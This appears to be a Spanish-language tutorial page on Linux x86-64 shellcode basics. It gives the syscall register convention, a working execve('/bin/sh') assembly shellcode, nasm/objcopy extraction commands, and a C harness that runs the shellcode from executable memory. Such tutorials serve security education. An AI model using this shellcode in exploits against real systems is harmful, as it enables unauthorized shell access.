# Shellcode Basics

Fundamentos de desarrollo de shellcode para Linux x86-64.

---

## Syscall Convention

| Register | Uso |
|----------|-----|
| RAX | syscall number |
| RDI | 1st argument |
| RSI | 2nd argument |
| RDX | 3rd argument |
| R10 | 4th argument |

!!! note "Referencia"
    Lista completa de syscalls en `/usr/include/x86_64-linux-gnu/asm/unistd_64.h`

## Execve Shellcode

```asm
; execve("/bin/sh", NULL, NULL)
section .text
global _start

_start:
    xor rax, rax
    xor rdx, rdx
    push rax
    mov rbx, 0x68732f6e69622f2f  ; "//bin/sh"
    push rbx
    mov rdi, rsp
    push rax
    push rdi
    mov rsi, rsp
    mov al, 59                   ; execve
    syscall
```

!!! tip "NULL bytes"
    Evita instrucciones que generen bytes `0x00` como `mov rax, 0`. Usa `xor rax, rax` en su lugar.

## Compilar y extraer

```bash
# Ensamblar
nasm -f elf64 shell.asm -o shell.o
ld shell.o -o shell

# Extraer bytes
objcopy -O binary shell shell.bin
xxd -i shell.bin
```

## Testing

```c
#include <sys/mman.h>
#include <string.h>

unsigned char shellcode[] = "\x48\x31\xc0...";

int main() {
    void *exec = mmap(NULL, sizeof(shellcode),
                      PROT_READ|PROT_WRITE|PROT_EXEC,
                      MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    memcpy(exec, shellcode, sizeof(shellcode));
    ((void(*)())exec)();
}
```

```bash
gcc -z execstack -o test test.c
./test
```

!!! danger "Disclaimer"
    Este contenido es exclusivamente para fines educativos en entornos controlados.

---

!!! tip "Recursos"
    - [pwntools](https://github.com/Gallopsled/pwntools) — Framework de explotación
    - [shellcraft](https://docs.pwntools.com/en/stable/shellcraft.html) — Generador de shellcode
